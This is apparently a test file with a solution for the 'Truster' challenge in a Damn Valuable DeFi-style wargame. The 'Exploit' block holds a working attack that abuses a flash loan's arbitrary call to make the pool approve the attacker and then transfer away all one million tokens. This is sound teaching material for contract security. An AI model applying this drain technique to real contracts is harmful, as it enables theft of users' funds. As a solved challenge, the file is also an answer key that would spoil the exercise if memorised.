const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        //I use the free call to any address to set an approval to the attacker to transfer the funds on 
        //behalf the pool on a different call

        //Create data for transaction to approve transfer of funds on behalf of the attacker
        let dataTx = this.token.interface.encodeFunctionData('approve(address,uint256)', [attacker.address, TOKENS_IN_POOL])
        //Exceute dummy flashloan (I dont even care who receives the flash loan and the amount borrowed)
        await this.pool.flashLoan(0, this.pool.address, this.token.address, dataTx)
        let attackerTokenInstance = await this.token.connect(attacker)
        //Use approved funds to transfer them to attacker on behalf of the pool
        await attackerTokenInstance.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

